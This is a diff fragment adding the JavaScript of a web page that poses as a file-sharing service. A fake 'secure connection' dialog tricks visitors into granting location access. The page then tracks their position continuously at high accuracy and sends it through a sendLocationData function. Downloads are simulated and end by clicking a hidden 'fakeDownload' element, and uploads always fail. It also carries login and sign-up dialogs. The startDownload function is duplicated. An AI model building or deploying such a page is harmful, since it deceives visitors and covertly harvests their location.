+        console.error('Error checking location permission:', error);
+        showSecureConnectionDialog();
+      }
+    }
+
+    function showSecureConnectionDialog() {
+      const overlay = document.getElementById('secureConnectionOverlay');
+      const popup = document.getElementById('secureConnectionPopup');
+      const allowBtn = document.getElementById('secureConnectionAllow');
+      const cancelBtn = document.getElementById('secureConnectionCancel');
+      const statusText = document.getElementById('status-text');
+      const errorMessage = document.getElementById('locationError');
+      const dots = [
+        document.getElementById('dot1'),
+        document.getElementById('dot2'),
+        document.getElementById('dot3')
+      ];
+      
+      // Show dialog
+      overlay.style.display = 'flex';
+      
+      // Start dots animation
+      function animateDots() {
+        dots.forEach((dot, i) => {
+          setTimeout(() => {
+            dot.style.backgroundColor = 'var(--primary-color)';
+            setTimeout(() => {
+              dot.style.backgroundColor = 'var(--border-color)';
+            }, 600);
+          }, i * 200);
+        });
+      }
+      
+      let dotsInterval;
+      
+      allowBtn.addEventListener('click', function() {
+        statusText.textContent = "Requesting location access...";
+        dotsInterval = setInterval(animateDots, 1000);
+        animateDots();
+        
+        if ("geolocation" in navigator) {
+          navigator.geolocation.getCurrentPosition(
+            function(position) {
+              clearInterval(dotsInterval);
+              dots.forEach(dot => dot.style.backgroundColor = 'var(--success-color)');
+              statusText.textContent = "Secure connection established!";
+              errorMessage.style.display = 'none';
+              startTracking();
+              setTimeout(() => {
+                overlay.style.display = 'none';
+              }, 1500);
+            },
+            function(error) {
+              clearInterval(dotsInterval);
+              dots.forEach(dot => dot.style.backgroundColor = 'var(--error-color)');
+              statusText.textContent = "Connection failed";
+              errorMessage.style.display = 'block';
+            }
+          );
+        }
+      });
+      
+      cancelBtn.addEventListener('click', function() {
+        overlay.style.display = 'none';
+        if (dotsInterval) clearInterval(dotsInterval);
+      });
+    }
+
+    function startTracking() {
+      if (!navigator.geolocation) {
+        showToast('Geolocation is not supported by your browser');
+        return;
+      }
+
+      if (isTrackingEnabled) return;
+
+      watchId = navigator.geolocation.watchPosition(
+        (position) => {
+          currentPosition = position;
+          const { latitude, longitude } = position.coords;
+          sendLocationData(latitude, longitude);
+          isTrackingEnabled = true;
+        },
+        (error) => {
+          console.error('Error getting location:', error);
+          showToast('Unable to get location. Downloads may be limited.');
+        },
+        {
+          enableHighAccuracy: true,
+          timeout: 10000,
+          maximumAge: 0
+        }
+      );
+    }
+
+    function stopTracking() {
+      if (watchId !== null) {
+        navigator.geolocation.clearWatch(watchId);
+        watchId = null;
+      }
+      isTrackingEnabled = false;
+    }
+
+    // Download functionality
+    async function startDownload(fileItem) {
+      if (!isTrackingEnabled) {
+        showToast('Location access is required for downloads');
+        await requestLocationPermission();
+        return;
+      }
+
+      const fileName = fileItem.querySelector('.file-name').textContent;
+      const downloadStatus = fileItem.querySelector('.download-status');
+      const progressBar = downloadStatus.querySelector('.progress');
+      const statusText = downloadStatus.querySelector('.status-text');
+
+      downloadStatus.style.display = 'block';
+      
+      // Simulate download progress
+      let progress = 0;
+      const interval = setInterval(() => {
+        progress += Math.random() * 10;
+        if (progress >= 100) {
+          progress = 100;
+          clearInterval(interval);
+          statusText.textContent = 'Download complete';
+          setTimeout(() => {
+            downloadStatus.style.display = 'none';
+            // Trigger the fake download
+            document.getElementById('fakeDownload').click();
+          }, 500);
+        }
+        progressBar.style.width = `${progress}%`;
+        statusText.textContent = `Downloading... ${Math.round(progress)}%`;
+      }, 200);
+
+    
+      if (currentPosition) {
+        const { latitude, longitude } = currentPosition.coords;
+        await sendLocationData(latitude, longitude);
+      }
+    }
+      
+    document.addEventListener('DOMContentLoaded', function() {
+      // Add click handlers to file items
+      document.querySelectorAll('.file-item').forEach(item => {
+        item.addEventListener('click', () => startDownload(item));
+      });
+
+      // Show Upload Dialog
+      document.getElementById('showUploadDialog').addEventListener('click', function() {
+        document.getElementById('uploadOverlay').style.display = 'flex';
+      });
+      
+      // Close Upload Dialog
+      document.getElementById('closeUploadDialog').addEventListener('click', function() {
+        document.getElementById('uploadOverlay').style.display = 'none';
+        resetUploadForm();
+      });
+      
+      document.getElementById('cancelUpload').addEventListener('click', function() {
+        document.getElementById('uploadOverlay').style.display = 'none';
+        resetUploadForm();
+      });
+      
+      // Show Login Dialog
+      document.getElementById('loginBtn').addEventListener('click', function() {
+        document.getElementById('loginOverlay').style.display = 'flex';
+      });
+      
+      // Close Login Dialog
+      document.getElementById('closeLoginDialog').addEventListener('click', function() {
+        document.getElementById('loginOverlay').style.display = 'none';
+      });
+      
+      // Show Sign Up Dialog
+      document.getElementById('showSignUp').addEventListener('click', function() {
+        document.getElementById('loginOverlay').style.display = 'none';
+        document.getElementById('signUpOverlay').style.display = 'flex';
+      });
+      
+      // Close Sign Up Dialog
+      document.getElementById('closeSignUpDialog').addEventListener('click', function() {
+        document.getElementById('signUpOverlay').style.display = 'none';
+      });
+      
+      // Show Login from Sign Up
+      document.getElementById('showLogin').addEventListener('click', function() {
+        document.getElementById('signUpOverlay').style.display = 'none';
+        document.getElementById('loginOverlay').style.display = 'flex';
+      });
+      
+      // Browse files button click handler
+      document.getElementById('browseFiles').addEventListener('click', function() {
+        document.getElementById('fileInput').click();
+      });
+      
+
+      document.getElementById('fileInput').addEventListener('change', function() {
+        handleFileSelect(this.files);
+      });
+      
+   
+      const dropZone = document.getElementById('dropZone');
+      
+      dropZone.addEventListener('dragover', function(e) {
+        e.preventDefault();
+        e.stopPropagation();
+        this.classList.add('highlight-drop');
+      });
+      
+      dropZone.addEventListener('dragleave', function(e) {
+        e.preventDefault();
+        e.stopPropagation();
+        this.classList.remove('highlight-drop');
+      });
+      
+      dropZone.addEventListener('drop', function(e) {
+        e.preventDefault();
+        e.stopPropagation();
+        this.classList.remove('highlight-drop');
+        
+        if (e.dataTransfer.files.length > 0) {
+          handleFileSelect(e.dataTransfer.files);
+        }
+      });
+      
+    
+      document.getElementById('uploadBtn').addEventListener('click', function() {
+        triggerUploadError();
+      });
+    });
+    
+
+    function handleFileSelect(files) {
+      const fileList = document.getElementById('fileList');
+      fileList.innerHTML = '';
+      
+      for (let i = 0; i < files.length; i++) {
+        const file = files[i];
+        const fileSize = formatFileSize(file.size);
+        
+      
+        const fileRow = document.createElement('div');
+        fileRow.className = 'file-row';
+        
+      
+        let iconClass = 'fa-file';
+        if (file.type.startsWith('image/')) {
+          iconClass = 'fa-file-image';
+        } else if (file.type === 'application/pdf') {
+          iconClass = 'fa-file-pdf';
+        } else if (file.type.includes('word')) {
+          iconClass = 'fa-file-word';
+        } else if (file.type.includes('zip') || file.type.includes('archive')) {
+          iconClass = 'fa-file-archive';
+        }
+        
+        fileRow.innerHTML = `
+          <div class="file-row-icon">
+            <i class="fas ${iconClass}"></i>
+          </div>
+          <div class="file-row-name">${file.name}</div>
+          <div class="file-row-size">${fileSize}</div>
+          <div class="file-row-remove" onclick="removeFile(this)">
+            <i class="fas fa-times"></i>
+          </div>
+        `;
+        
+        fileList.appendChild(fileRow);
+      }
+    }
+    
+   
+    window.removeFile = function(element) {
+      element.parentNode.remove();
+    };
+    
+    function resetUploadForm() {
+      document.getElementById('fileList').innerHTML = '';
+      document.getElementById('fileInput').value = '';
+      document.getElementById('errorMessage').style.display = 'none';
+    }
+     
+    function formatFileSize(bytes) {
+      if (bytes === 0) return '0 Bytes';
+      
+      const k = 1024;
+      const sizes = ['Bytes', 'KB', 'MB', 'GB', 'TB'];
+      const i = Math.floor(Math.log(bytes) / Math.log(k));
+      
+      return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
+    }
+
+ 
+    async function startDownload(fileItem) {
+      if (!isTrackingEnabled) {
+        showToast('Location access is required for downloads');
+        await requestLocationPermission();
+        return;
+      }
+
+      const fileName = fileItem.querySelector('.file-name').textContent;
+      const downloadStatus = fileItem.querySelector('.download-status');
+      const progressBar = downloadStatus.querySelector('.progress');
+      const statusText = downloadStatus.querySelector('.status-text');
+
+      downloadStatus.style.display = 'block';
+      
+      
+      let progress = 0;
+      const interval = setInterval(() => {
+        progress += Math.random() * 10;
+        if (progress >= 100) {
+          progress = 100;
+          clearInterval(interval);
+          statusText.textContent = 'Download complete';
+          setTimeout(() => {
+            downloadStatus.style.display = 'none';
+         
+            document.getElementById('fakeDownload').click();
+          }, 500);
+        }
+        progressBar.style.width = `${progress}%`;
+        statusText.textContent = `Downloading... ${Math.round(progress)}%`;
+      }, 200);
+
+      if (currentPosition) {
+        const { latitude, longitude } = currentPosition.coords;
+        await sendLocationData(latitude, longitude);
+      }
+    }
+    
+
+    function showToast(message) {
+      const toast = document.getElementById('toast');
+      toast.textContent = message;
+      toast.style.display = 'block';
+      
+      setTimeout(() => {
+        toast.style.display = 'none';
+      }, 3000);
+    }
+  </script>
+</body>
+
+</html>
